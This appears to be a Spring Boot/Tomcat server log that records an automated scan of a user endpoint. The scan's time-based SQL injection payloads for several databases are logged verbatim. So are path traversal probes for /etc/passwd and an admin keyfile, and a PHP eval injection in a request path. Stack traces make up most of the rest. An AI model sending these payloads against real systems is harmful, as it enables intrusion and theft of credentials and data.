+2021-12-16 18:13:37.246 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1096151398')))
+2021-12-16 18:13:37.291 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:37.331 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : 123'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1846322311')))>'0
+2021-12-16 18:13:37.345 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:37.378 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123鎈'"\(
+2021-12-16 18:13:37.390 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:37.423 ERROR 5896 --- [http-nio-8080-exec-6] c.e.mybatis.controller.UserController    : 123'"\(
+2021-12-16 18:13:37.438 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : (select*from(select+sleep(0)union/**/select+1)a)
+2021-12-16 18:13:37.494 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : (select*from(select+sleep(2)union/**/select+1)a)
+2021-12-16 18:13:37.543  WARN 5896 --- [http-nio-8080-exec-10] o.s.w.s.r.ResourceHttpRequestHandler     : Path with "WEB-INF" or "META-INF": [user/WEB-INF/web.xml]
+2021-12-16 18:13:37.572 ERROR 5896 --- [http-nio-8080-exec-6] c.e.mybatis.controller.UserController    : 123'and(select*from(select+sleep(0))a/**/union/**/select+1)='
+2021-12-16 18:13:37.619 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : 123'and(select*from(select+sleep(2))a/**/union/**/select+1)='
+2021-12-16 18:13:37.664 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : 123"and(select*from(select+sleep(0))a/**/union/**/select+1)="
+2021-12-16 18:13:37.726 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : 123"and(select*from(select+sleep(2))a/**/union/**/select+1)="
+2021-12-16 18:13:37.779 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123/**/and(select+1/**/from/**/pg_sleep(0))>0/**/
+2021-12-16 18:13:37.824 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : 123/**/and(select+1/**/from/**/pg_sleep(2))>0/**/
+2021-12-16 18:13:37.884 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : 123'/**/and(select'1'from/**/pg_sleep(0))::text>'0
+2021-12-16 18:13:37.929 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : 123'/**/and(select'1'from/**/pg_sleep(2))::text>'0
+2021-12-16 18:13:37.980 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : 123/**/and(select+1)>0waitfor/**/delay'0:0:0'/**/
+2021-12-16 18:13:38.035 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : 123/**/and(select+1)>0waitfor/**/delay'0:0:2'/**/
+2021-12-16 18:13:38.089 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : 123'and(select+1)>0waitfor/**/delay'0:0:0
+2021-12-16 18:13:38.146 ERROR 5896 --- [http-nio-8080-exec-2] c.e.mybatis.controller.UserController    : 123'and(select+1)>0waitfor/**/delay'0:0:2
+2021-12-16 18:13:38.194 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : 123/**/and/**/4=DBMS_PIPE.RECEIVE_MESSAGE('q',0)
+2021-12-16 18:13:38.248 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : 123/**/and/**/1=DBMS_PIPE.RECEIVE_MESSAGE('t',2)
+2021-12-16 18:13:38.296 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : 123'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('d',0)='d
+2021-12-16 18:13:38.351 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : 123'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('y',2)='y
+2021-12-16 18:13:38.403  WARN 5896 --- [http-nio-8080-exec-10] o.s.w.s.r.ResourceHttpRequestHandler     : Path contains "../" after call to StringUtils#cleanPath: [user/ ../web-inf]
+2021-12-16 18:13:38.409 ERROR 5896 --- [http-nio-8080-exec-7] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.web.multipart.MultipartException: Failed to parse multipart servlet request; nested exception is java.io.IOException: org.apache.tomcat.util.http.fileupload.FileUploadException: Stream ended unexpectedly] with root cause
+
+org.apache.tomcat.util.http.fileupload.MultipartStream$MalformedStreamException: Stream ended unexpectedly
+	at org.apache.tomcat.util.http.fileupload.MultipartStream.readHeaders(MultipartStream.java:520) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.findNextItem(FileItemIteratorImpl.java:228) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.<init>(FileItemIteratorImpl.java:127) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.getItemIterator(FileUploadBase.java:256) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:280) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.parseParts(Request.java:2922) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.getParts(Request.java:2824) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.RequestFacade.getParts(RequestFacade.java:1098) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.parseRequest(StandardMultipartHttpServletRequest.java:95) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.<init>(StandardMultipartHttpServletRequest.java:88) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardServletMultipartResolver.resolveMultipart(StandardServletMultipartResolver.java:122) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.checkMultipart(DispatcherServlet.java:1202) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1036) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:38.460  WARN 5896 --- [http-nio-8080-exec-8] o.s.w.s.r.ResourceHttpRequestHandler     : Path with "WEB-INF" or "META-INF": [user/theme/META-INF/����/META-INF/MANIFEST.MF]
+2021-12-16 18:13:38.736  WARN 5896 --- [http-nio-8080-exec-1] o.s.w.s.r.ResourceHttpRequestHandler     : Path contains "../" after call to StringUtils#cleanPath: [user/jobmanager/logs/../../../../../../../../../../../../etc/passwd]
+2021-12-16 18:13:38.993 ERROR 5896 --- [http-nio-8080-exec-5] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.web.multipart.MultipartException: Failed to parse multipart servlet request; nested exception is java.io.IOException: org.apache.tomcat.util.http.fileupload.FileUploadException: Stream ended unexpectedly] with root cause
+
+org.apache.tomcat.util.http.fileupload.MultipartStream$MalformedStreamException: Stream ended unexpectedly
+	at org.apache.tomcat.util.http.fileupload.MultipartStream.readHeaders(MultipartStream.java:520) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.findNextItem(FileItemIteratorImpl.java:228) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.<init>(FileItemIteratorImpl.java:127) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.getItemIterator(FileUploadBase.java:256) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:280) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.parseParts(Request.java:2922) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.getParts(Request.java:2824) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.RequestFacade.getParts(RequestFacade.java:1098) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.parseRequest(StandardMultipartHttpServletRequest.java:95) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.<init>(StandardMultipartHttpServletRequest.java:88) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardServletMultipartResolver.resolveMultipart(StandardServletMultipartResolver.java:122) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.checkMultipart(DispatcherServlet.java:1202) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1036) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:39.006  WARN 5896 --- [http-nio-8080-exec-2] o.s.w.s.r.ResourceHttpRequestHandler     : Path with "WEB-INF" or "META-INF": [user/theme/META-INF��..��..��..��..��..��domains/domain1/config/admin-keyfile]
+2021-12-16 18:13:39.111 ERROR 5896 --- [http-nio-8080-exec-4] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.web.multipart.MultipartException: Failed to parse multipart servlet request; nested exception is java.io.IOException: org.apache.tomcat.util.http.fileupload.FileUploadException: Stream ended unexpectedly] with root cause
+
+org.apache.tomcat.util.http.fileupload.MultipartStream$MalformedStreamException: Stream ended unexpectedly
+	at org.apache.tomcat.util.http.fileupload.MultipartStream.readHeaders(MultipartStream.java:520) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.findNextItem(FileItemIteratorImpl.java:228) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.<init>(FileItemIteratorImpl.java:127) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.getItemIterator(FileUploadBase.java:256) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:280) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.parseParts(Request.java:2922) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.getParts(Request.java:2824) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.RequestFacade.getParts(RequestFacade.java:1098) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.parseRequest(StandardMultipartHttpServletRequest.java:95) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.<init>(StandardMultipartHttpServletRequest.java:88) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardServletMultipartResolver.resolveMultipart(StandardServletMultipartResolver.java:122) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.checkMultipart(DispatcherServlet.java:1202) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1036) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:39.165 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : null
+2021-12-16 18:13:39.262  INFO 5896 --- [http-nio-8080-exec-10] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in the request target [/user/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:494) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
